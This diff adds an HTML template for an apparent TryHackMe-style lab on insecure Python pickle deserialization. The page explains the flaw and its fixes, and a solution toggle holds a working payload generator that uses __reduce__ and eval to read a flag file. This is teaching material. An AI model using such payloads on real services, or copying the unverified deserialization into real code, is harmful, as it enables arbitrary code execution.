@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>{{ lab.title }}</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;600&family=Source+Sans+Pro:wght@400;500&display=swap"
+    />
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}" />
+  </head>
+  <body>
+    <header class="hero">
+      <div>
+        <p class="eyebrow">TryHackMe • OWASP Top 10</p>
+        <h1>{{ lab.title }}</h1>
+        <p class="tagline">{{ lab.tagline }}</p>
+        <p class="explanation">{{ lab.explanation }}</p>
+      </div>
+    </header>
+
+    <main class="layout">
+      <section class="card">
+        <h2>Deserialize Object</h2>
+        <p class="muted">
+          Enter base64-encoded pickle data below. The application will deserialize it without any integrity verification.
+        </p>
+
+        <form method="POST" class="stack">
+          <label class="label" for="pickle_data">Pickle Data (base64)</label>
+          <textarea
+            id="pickle_data"
+            name="pickle_data"
+            rows="6"
+            placeholder="Enter base64-encoded pickle data..."
+          >{{ pickle_input }}</textarea>
+          <button type="submit">Deserialize</button>
+        </form>
+
+        {% if error_message %}
+        <div class="callout error">
+          <p><strong>Error:</strong> {{ error_message }}</p>
+        </div>
+        {% endif %}
+
+        {% if deserialized_output %}
+        <div class="output-box">
+          <p class="muted">Deserialized Output</p>
+          <div class="output-content">
+            <pre>{{ deserialized_output }}</pre>
+          </div>
+        </div>
+        {% endif %}
+      </section>
+
+      <aside class="card">
+        <h2>Why This is Vulnerable</h2>
+        <ul class="pillars">
+          <li><strong>No integrity verification</strong> - The app accepts any pickle data without checking signatures or hashes.</li>
+          <li><strong>Unsafe deserialization</strong> - Python's pickle can execute arbitrary code during deserialization.</li>
+          <li><strong>Trust boundary violation</strong> - Untrusted user input is deserialized as if it came from a trusted source.</li>
+          <li><strong>No input validation</strong> - No schema validation or whitelisting of allowed object types.</li>
+        </ul>
+
+        <div class="callout info" style="margin-top: 1rem;">
+          <p><strong>Attack Vector:</strong></p>
+          <p style="margin-top: 0.5rem;">
+            Craft a malicious pickle payload that reads <code>{{ flag_path }}</code> when deserialized. 
+            The pickle module allows arbitrary code execution via the <code>__reduce__</code> method.
+          </p>
+        </div>
+
+        <div class="callout" style="margin-top: 1rem;">
+          <p><strong>Fix:</strong></p>
+          <ul style="margin: 0.5rem 0 0; padding-left: 1.25rem;">
+            <li>Use safe serialization formats (JSON, YAML with safe_load)</li>
+            <li>Verify digital signatures before deserializing</li>
+            <li>Whitelist allowed object types</li>
+            <li>Use restricted unpicklers or sandboxed environments</li>
+            <li>Never deserialize untrusted data</li>
+          </ul>
+        </div>
+      </aside>
+    </main>
+
+    <footer class="card">
+      <details class="solution-toggle">
+        <summary>Toggle solution</summary>
+        <div class="solution-content">
+          <h3>Solution Steps</h3>
+          <ol class="steps">
+            <li>Create a Python script to generate a malicious pickle payload that reads <code>{{ flag_path }}</code></li>
+            <li>The payload should use pickle's <code>__reduce__</code> to execute <code>open('{{ flag_path }}').read()</code></li>
+            <li>Base64 encode the pickle payload</li>
+            <li>Submit the base64-encoded payload to the form</li>
+            <li>The deserialized output will contain the flag</li>
+          </ol>
+          <div class="code-example">
+            <p class="muted">Example Python code to generate payload:</p>
+            <pre>import pickle
+import base64
+
+class Malicious:
+    def __reduce__(self):
+        # Return a tuple: (callable, args)
+        # This will execute: open('{{ flag_path }}').read()
+        return (eval, ("open('{{ flag_path }}').read()",))
+
+# Generate and encode the payload
+payload = pickle.dumps(Malicious())
+encoded = base64.b64encode(payload).decode()
+print(encoded)
+
+# Copy the output and paste it into the form</pre>
+          </div>
+        </div>
+      </details>
+    </footer>
+  </body>
+</html>
